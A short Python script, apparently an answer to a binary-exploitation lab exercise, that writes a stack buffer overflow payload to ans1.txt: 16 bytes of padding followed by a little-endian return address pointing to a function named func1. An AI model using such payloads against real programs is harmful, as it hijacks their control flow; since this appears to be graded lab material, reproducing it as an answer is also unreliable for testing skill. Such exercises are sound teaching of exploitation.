# padding: 8 (buffer) + 8 (saved rbp) = 16 bytes
padding = b"A" * 16 

# func1 address: 0x401216
# 转换成 8 字节小端序
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload generated in ans1.txt")